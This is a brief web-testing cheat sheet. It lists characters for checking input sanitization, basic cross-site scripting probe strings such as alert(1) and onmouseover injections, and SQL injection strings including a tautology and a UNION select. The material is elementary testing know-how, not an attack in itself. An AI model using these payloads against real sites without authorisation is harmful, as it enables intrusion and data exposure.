# Cheat sheet

## Input sanitization

```
'<>:;"
```

## XSS

Try these out to check how well input is being sanitized.

```
"><h1>test</h1>
'+alert(1)+'
"onmouseover="alert(1)
http://"onmouseover="alert(1)
```

## SQL injection

```sql
' or 1='1 --This returns all rows
' and 0='1 --This returns no rows


' UNION select 1,2,3; --'; -- Can be attached to the end of an existing select
```
